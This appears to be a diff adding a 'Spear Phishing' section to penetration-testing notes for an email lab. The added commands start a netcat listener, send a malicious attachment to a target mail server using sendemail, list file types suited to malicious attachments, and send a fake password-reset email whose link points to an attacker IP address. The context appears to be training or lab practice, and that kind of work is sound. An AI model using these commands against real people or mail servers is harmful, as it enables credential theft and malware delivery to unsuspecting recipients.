@@ -76,3 +76,17 @@ Login with credentials
 ### 3) Connection
 
 Upon connecting, refer to this repo in the "Network Penetration Testing" section. There, the email protocols are explained in detail on how to interact with them.
+
+### 4) Spear Phishing
+
+Setup listener
+
+    sudo nc -lvnp 80
+
+Send an email with a malicious attachment to the target. (Files to use: .ods, .odt, .pdf, .exe, .dll, .xll, docm)
+
+    sendemail -f 'jonas@localhost' -t 'mailadmin@localhost' -s TARGET_IP:25 -u 'Your Spreadsheet' -m 'Here is your Spreadsheet' -a whatever.ods
+
+Send a basic password reset phishing attack
+
+    sendemail -f 'it@postfish.off' -t 'brian.moore@postfish.off' -s postfish.off:25 -u 'Password Reset' -m 'Could you please connect here to reset your password? Link: http://192.168.45.237/' -o tls=no
